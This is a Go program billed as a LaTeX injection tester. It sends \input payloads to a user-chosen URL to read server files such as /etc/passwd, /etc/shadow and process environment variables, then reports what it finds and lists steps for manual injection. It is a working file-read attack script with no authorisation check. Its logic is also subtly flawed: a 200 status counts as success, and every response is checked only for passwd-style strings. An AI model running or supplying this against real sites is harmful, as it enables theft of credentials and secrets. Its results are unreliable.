package main

import (
	"fmt"
	"net/http"
	"strings"
)

func main() {
	fmt.Println("Welcome to LaTeX Injection Vulnerability Tester")
	fmt.Print("Enter your target website URL: ")
	var targetURL string
	fmt.Scanln(&targetURL)

	// Test for vulnerability and collect sensitive information
	vulnerable, sensitiveInfo, err := testVulnerability(targetURL)
	if err != nil {
		fmt.Println("Error occurred:", err)
		return
	}

	// Display results
	if vulnerable {
		fmt.Println("The target website is vulnerable to LaTeX Injection.")
		fmt.Println("Sensitive information found:")
		for _, info := range sensitiveInfo {
			fmt.Println("- ", info)
		}
		fmt.Println("Here's how to test the vulnerability:")
		fmt.Println("1. Visit the vulnerable page on the target website.")
		fmt.Println("2. Inject LaTeX code into input fields or parameters that accept user input.")
		fmt.Println("3. Submit the form or request and observe if the injected LaTeX code is executed or rendered.")
	} else {
		fmt.Println("The target website is not vulnerable to LaTeX Injection.")
	}
}

// Function to test for LaTeX Injection vulnerability and collect sensitive information
func testVulnerability(targetURL string) (bool, []string, error) {
	// Define payloads to test for LaTeX Injection vulnerability and collect sensitive information
	payloads := []string{
		`\input{/etc/passwd}`,         // Try to read the /etc/passwd file
		`\input{/etc/shadow}`,         // Try to read the /etc/shadow file
		`\input{/proc/self/cmdline}`,  // Try to read the command line of the server process
		`\input{/etc/hostname}`,       // Try to read the hostname of the server
		`\input{/proc/self/environ}`,  // Try to read the environment variables of the server process
		`\input{/proc/cpuinfo}`,       // Try to read CPU information
		`\input{/proc/meminfo}`,       // Try to read memory information
		`\input{/proc/version}`,       // Try to read the Linux kernel version
		`\input{/etc/hosts}`,          // Try to read the hosts file
	}

	var sensitiveInfo []string
	var successfulPayloads []string

	fmt.Println("Testing for LaTeX Injection vulnerability...")
	// Send requests with payloads and check the responses
	for _, payload := range payloads {
		fmt.Printf("Sending request with payload: %s\n", payload)
		// Send a POST request with the payload
		resp, err := http.Post(targetURL, "text/plain", strings.NewReader(payload))
		if err != nil {
			return false, nil, err
		}
		defer resp.Body.Close()

		// Check the response status code
		if resp.StatusCode == http.StatusOK {
			fmt.Printf("Payload '%s' executed successfully\n", payload)
			successfulPayloads = append(successfulPayloads, payload)

			// Read the response body
			body := make([]byte, 512)
			_, err := resp.Body.Read(body)
			if err != nil {
				return false, nil, err
			}

			// Check if the response body contains sensitive information
			if strings.Contains(string(body), "root:") || strings.Contains(string(body), "nobody:") {
				sensitiveInfo = append(sensitiveInfo, payload)
			}
		} else {
			fmt.Printf("Payload '%s' did not execute successfully\n", payload)
		}
	}

	if len(sensitiveInfo) > 0 {
		return true, sensitiveInfo, nil
	}

	fmt.Println("No sensitive information found.")
	return false, nil, nil
}
